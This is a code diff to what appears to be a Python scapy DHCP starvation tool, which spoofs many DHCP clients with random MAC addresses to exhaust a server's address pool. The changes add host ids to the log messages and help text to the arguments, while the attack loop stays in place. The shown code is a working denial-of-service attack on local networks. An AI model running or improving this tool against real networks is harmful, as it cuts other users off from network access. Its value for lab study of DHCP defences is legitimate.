@@ -2,6 +2,7 @@ from scapy.all import *
 from threading import Thread
 from utils import is_valid_MAC, IPV4_BROADCAST, IPV4_NETWORK, MAC_BROADCAST, starve_logger
 import argparse
+import sys
 from time import sleep
 
 class SpoofHost():
@@ -9,11 +10,17 @@ class SpoofHost():
     Class representing a legitimate host on the network as far as the DHCP server is concerned.
     Will perform a standard DHCP handshake to receive an IP address.
     '''
-    def __init__(self, desired_mac: str = None):
+    def __init__(self, host_id: int = 0, desired_mac: str = None):
         if desired_mac is not None and is_valid_MAC(desired_mac):
             self._mac_addr = desired_mac
         else:
             self._mac_addr = RandMAC()
+            
+        try:
+            self._host_id = int(host_id)
+        except ValueError:
+            self._host_id = 0
+            
         self.filter = f"udp and (port 67 or 68)"
         self._ipv4_addr = None
 
@@ -42,8 +49,8 @@ class SpoofHost():
             self._ipv4_addr = sniffed_pkt[BOOTP].yiaddr
             self._recent_transaction_id = sniffed_pkt[BOOTP].xid
 
-            starve_logger.info(f"TRANSACTION {self._recent_transaction_id}: DHCP OFFER from {self.dhcp_server_mac}.")
-            starve_logger.info(f"TRANSACTION {self._recent_transaction_id}: Sending DHCP REQUEST.")
+            starve_logger.info(f"HOST {self._host_id} - TRANSACTION {self._recent_transaction_id}: DHCP OFFER from {self.dhcp_server_mac}.")
+            starve_logger.info(f"HOST {self._host_id} - TRANSACTION {self._recent_transaction_id}: Sending DHCP REQUEST.")
             req = self.request_pkt
             sendp(req, verbose=0)
 
@@ -52,8 +59,8 @@ class SpoofHost():
             self.dhcp_server_ip = sniffed_pkt[IP].src
             self.dhcp_server_mac = sniffed_pkt[Ether].src
 
-            starve_logger.info(f"TRANSACTION {self._recent_transaction_id}: DHCP ACK from {self.dhcp_server_mac}.")
-            starve_logger.info(f"TRANSACTION {self._recent_transaction_id}: DHCP handshake completed.")
+            starve_logger.info(f"HOST {self._host_id} - TRANSACTION {self._recent_transaction_id}: DHCP ACK from {self.dhcp_server_mac}.")
+            starve_logger.info(f"HOST {self._host_id} - TRANSACTION {self._recent_transaction_id}: DHCP handshake completed.")
 
 
     @staticmethod
@@ -108,17 +115,17 @@ class SpoofHost():
 
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser("DHCP Starvation Utility")
+    parser = argparse.ArgumentParser(f"{sys.argv[0]}")
     parser.add_argument("--num-hosts", dest="hosts", type=int, default=5, help="Number of DHCP clients to spoof.")
     parser.add_argument("--delay", dest="delay", type=float, default=0.5, help="Delay between each host initiating DHCP handshake.")
-    parser.add_argument("--store-hosts", dest="store", action="store_true")
+    parser.add_argument("--store-hosts", dest="store", action="store_true", help="Store existing hosts")
     args = parser.parse_args()
 
     if args.store:
         host_macs = set()
     
     for i in range(args.hosts):
-        host = SpoofHost()
+        host = SpoofHost(host_id=i)
         if args.store:
             host_macs.add(host.mac)
         host.starve()
